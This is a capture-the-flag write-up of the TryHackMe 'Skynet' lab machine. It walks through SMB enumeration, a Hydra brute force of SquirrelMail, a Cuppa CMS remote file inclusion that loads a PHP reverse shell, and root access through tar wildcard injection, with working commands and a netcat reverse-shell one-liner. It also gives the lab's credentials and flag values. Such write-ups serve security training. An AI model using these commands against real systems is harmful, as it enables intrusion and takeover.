# 🤖 Skynet — TryHackMe Write-up

**Author:** NEPHOS  
**Date:** March 10, 2026  
**Difficulty:** Easy  
**Platform:** TryHackMe  
**OS:** Linux  
**Tags:** `SMB` `SquirrelMail` `Hydra` `RFI` `CuppaCMS` `Cronjob` `Tar Wildcard`

---

## 📋 Table of Contents

1. [Introduction](#introduction)
2. [Reconnaissance](#reconnaissance)
3. [SMB Enumeration](#smb-enumeration)
4. [Brute Forcing the Webmail](#brute-forcing-the-webmail)
5. [Accessing SquirrelMail](#accessing-squirrelmail)
6. [Discovering the Hidden Directory](#discovering-the-hidden-directory)
7. [Exploiting Cuppa CMS — RFI](#exploiting-cuppa-cms--rfi)
8. [Privilege Escalation — Tar Wildcard](#privilege-escalation--tar-wildcard)
9. [Flags Summary](#flags-summary)
10. [Lessons Learned](#lessons-learned)

---

## 🧩 Introduction

**Skynet** is a Terminator-themed Linux machine on TryHackMe. The attack path covers a realistic chain of vulnerabilities: SMB anonymous access → credential discovery → webmail brute force → hidden directory → Remote File Inclusion → privilege escalation via a cronjob tar wildcard exploit.

**Target IP:** `10.113.184.150`  
**Attacker IP (tun0):** `192.168.142.56`

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
sudo nmap -sV -sC -Pn 10.113.184.150
```

### Results

```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  open  http         Apache httpd 2.4.18
110/tcp open  pop3         Dovecot pop3d
139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X
143/tcp open  imap         Dovecot imapd
445/tcp open  microsoft-ds Samba smbd 4.3.11-Ubuntu
```

### Analysis

| Port | Service | Relevance |
|------|---------|-----------|
| 22 | SSH | Later entry point |
| 80 | HTTP | Web application → Skynet page |
| 110/143 | POP3/IMAP | Email server (SquirrelMail) |
| 139/445 | **SMB** | 🎯 Starting point |

---

## 📂 SMB Enumeration

### Step 1 — List Available Shares

```bash
smbclient -L //10.113.184.150/ --no-pass
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
IPC$            IPC       IPC Service
```

Two interesting shares: `anonymous` (no auth) and `milesdyson` (requires credentials).

### Step 2 — Access Anonymous Share

```bash
smbclient //10.113.184.150/anonymous --no-pass
```

```
smb: \> ls
  attention.txt
  logs/
    log1.txt   ← 471 bytes
    log2.txt   ← empty
    log3.txt   ← empty
```

### Step 3 — Download Files

```bash
get attention.txt
cd logs
get log1.txt
```

### Findings

**`attention.txt`:**
> *"A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. — Miles Dyson"*

**`log1.txt`** — A password wordlist:

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
...
```

---

## 🔐 Brute Forcing the Webmail

With the wordlist in hand and the known username `milesdyson`, we brute force the SquirrelMail login.

```bash
hydra -l milesdyson -P log1.txt 10.113.184.150 \
  http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." \
  -t 1 -w 5 -f
```

> `-t 1` reduces threads to avoid connection errors from the server rate-limiting us.

### Result ✅

```
[80][http-post-form] host: 10.113.184.150
  login: milesdyson
  password: cyborg007haloterminator
```

---

## 📧 Accessing SquirrelMail

**URL:** `http://10.113.184.150/squirrelmail`

Login with:
- **Username:** `milesdyson`
- **Password:** `cyborg007haloterminator`

### Inbox — Key Emails

**Email 1 — Samba Password Reset:**
> *"We have changed your smb password after system malfunction."*  
> **New SMB password:** `)s{A&2Z=F^n_E.B\``

### Accessing Miles' SMB Share

```bash
smbclient //10.113.184.150/milesdyson -U milesdyson
# Password: )s{A&2Z=F^n_E.B`
```

```
smb: \> ls
  notes/
    important.txt  ← key file
  [ML PDFs...]
```

**`important.txt`:**
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

🎯 **Hidden directory found:** `/45kra24zxs28v3yd`

---

## 🌐 Discovering the Hidden Directory

### Web Enumeration

```bash
gobuster dir \
  -u http://10.113.184.150/45kra24zxs28v3yd/ \
  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt
```

**Result:**
```
/administrator  (Status: 301)
```

Navigating to `http://10.113.184.150/45kra24zxs28v3yd/administrator/` reveals a **Cuppa CMS** login page.

---

## 💥 Exploiting Cuppa CMS — RFI

### Finding the Vulnerability

```bash
searchsploit cuppa cms
```

```
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
Path: php/webapps/25971.txt
```

The vulnerable parameter is `urlConfig` in `alertConfigField.php`.

> **RFI (Remote File Inclusion):** A vulnerability that allows an attacker to include a remote file (e.g., a PHP shell) through a URL parameter, which the server then executes.

### Step 1 — Prepare the Reverse Shell

```bash
curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php \
  -o ~/shell.php
```

Edit the shell:
```php
$ip = '192.168.142.56';  // Attacker tun0 IP
$port = 4444;
```

### Step 2 — Start HTTP Server

```bash
cd ~
python3 -m http.server 8080
```

### Step 3 — Start Netcat Listener

```bash
nc -lvnp 4444
```

### Step 4 — Trigger the RFI

```
http://10.113.184.150/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.142.56:8080/shell.php
```

### Shell Received ✅

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### User Flag

```bash
cat /home/milesdyson/user.txt
```

```
7ce5c2109a40f958099283600a9ae807
```

---

## ⬆️ Privilege Escalation — Tar Wildcard

### Investigating Cronjobs

```bash
cat /etc/crontab
```

```
*/1 * * * *   root  /home/milesdyson/backups/backup.sh
```

A script running as **root** every minute!

### Examining the Script

```bash
cat /home/milesdyson/backups/backup.sh
```

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

### The Vulnerability — Tar Wildcard Injection

The `*` wildcard in `tar` is expanded by the shell before execution. We can inject fake "filenames" that `tar` interprets as flags.

### Exploitation

```bash
cd /var/www/html

# Create malicious files
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.142.56 5555 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

### Start Second Listener

```bash
nc -lvnp 5555
```

Wait ~60 seconds for cron to trigger...

### Root Shell Received ✅

```bash
whoami
# root

cat /root/root.txt
```

```
3f0372db24753accc7179a282cd6a949
```

---

## 🏁 Flags Summary

| Flag | Value |
|------|-------|
| 🔵 Miles' Email Password | `cyborg007haloterminator` |
| 🔵 Hidden Directory | `/45kra24zxs28v3yd` |
| 🔵 Vulnerability Name | `Remote File Inclusion` |
| 🟡 User Flag | `7ce5c2109a40f958099283600a9ae807` |
| 🔴 Root Flag | `3f0372db24753accc7179a282cd6a949` |

---

## 📚 Lessons Learned

### What We Practiced

- **SMB Enumeration** — Always check for anonymous shares; they often contain sensitive files.
- **Credential Reuse** — Passwords found in one place (SMB) can open other doors (webmail).
- **Hydra Brute Force** — Understanding HTTP POST form parameters is key to correct syntax.
- **Remote File Inclusion (RFI)** — Always validate and sanitize URL parameters server-side.
- **Cronjob Analysis** — Running scripts as root with wildcards is extremely dangerous.
- **Tar Wildcard Injection** — A classic and underrated PrivEsc technique.

### Attack Chain Summary

```
Nmap
  └─► SMB Anonymous Login
        └─► log1.txt (wordlist) + attention.txt
              └─► Hydra → milesdyson:cyborg007haloterminator
                    └─► SquirrelMail → SMB Password + Hidden Dir
                          └─► /45kra24zxs28v3yd/administrator (Cuppa CMS)
                                └─► RFI → Reverse Shell → user.txt
                                      └─► Cronjob + Tar Wildcard → ROOT → root.txt
```

---

*Write-up by **NEPHOS** | TryHackMe | March 2026*  
*Portfolio: [obadahamed.github.io](https://obadahamed.github.io)*
